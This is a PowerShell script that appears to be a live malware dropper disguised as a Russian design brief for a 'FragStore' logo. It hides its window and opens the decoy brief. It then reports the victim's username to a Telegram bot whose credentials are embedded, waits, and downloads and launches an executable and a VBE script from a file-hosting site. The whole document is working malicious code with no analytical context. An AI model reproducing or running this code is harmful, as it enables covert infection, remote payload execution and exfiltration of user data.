Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="logo redesign.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
Техзадание: обновить логотип для FragStore.

Что хотим:
  Новый логотип для нашего интернет‑магазина FragStore. Нужен крутой, уверенный и современный стиль.

Цвета:
  Предлагаем такие сочетания:
  Оранжевый + Чёрный: #FF8C00 + #000000
  Тёмно‑оранжевый + Тёмно‑серый: #FF7A00 + #1F1F1F
  Яркий оранжевый + Белый + Чёрный акцент: #FFA500 + #FFFFFF + #000000
  Насыщенный чёрный + Неоновый оранжевый акцент: #000000 + #FF6A00
  Оранжевый‑металлик + Тёмно‑серый: #FF8C00 + #2B2B2B
  Градиент (можно для деталей): #FF8C00 → #FFA500

Идеи для логотипа (выберите любую):
  1. Буква F в виде кнопки включения.
  2. Буквы FS как шестиугольная мозаика.
  3. Эмблема в форме щита с молнией – чтобы чувствовалась надёжность и скорость.
  4. Простая иконка в виде корпуса или видеокарты.
  5. Курсор/стрелка + коробка/корзина – намёк на онлайн‑заказ и доставку.
  6. Наклонные линии – чтобы передать динамику и мощь.

Файлы:
  Обязательно: векторный файл SVG.
  Ещё: PNG/JPG для показа.
  Нужен файл с кодами цветов и названиями шрифтов.
  Минимальный размер значка: 24 пикселя.
  Никаких очень мелких деталей и плавных переходов.
  Нужны варианты для светлого и тёмного фона.
  Присылайте работы с водяными знаками.

Шрифты (если есть возможность):
  Montserrat – начертания 500/700/800.
  Rubik – начертания 500/700.
  Inter – начертания 400/600.
  PT Sans – начертания 400/700.
  Roboto Condensed – начертания 500/700 (не обязательно).

Сроки и доработки:
  Сделаем за 9 дней, не торопимся.
  Две итерации с правками.
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/OcWQ/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit